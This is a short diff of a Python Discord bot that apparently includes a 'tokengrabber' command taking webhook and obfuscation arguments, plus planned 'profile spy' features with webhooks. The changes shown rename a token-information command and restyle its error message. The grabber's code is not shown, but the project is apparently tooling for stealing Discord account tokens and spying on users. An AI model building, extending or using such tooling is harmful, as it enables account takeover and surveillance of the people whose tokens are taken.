@@ -35,6 +35,7 @@ from discord.ext import commands
                 # fix profile spy
                 # add await ctx.message.add_reaction("✔️") to every command
                 # perhaps add some user token functions
+                # add webhooks to spies
                 # ================ to do list ================ # 
 
 
@@ -672,7 +673,7 @@ async def tokengrabber(ctx, webhook, obfus):
 
 
 @bot.command()
-async def tokeninformation(ctx, token):
+async def tokinfo(ctx, token):
     
     
     info = tokeninfo(token)
@@ -713,7 +714,8 @@ async def tokeninformation(ctx, token):
             pass
 
     except Exception as e:
-        await ctx.reply(info)
+        embaed = discord.Embed(title="", description=f":x:  {info}", color=discord.Color.red())
+        await ctx.reply(embed=embaed)
         print(e)
     
 #                                  non bot functions                                      #
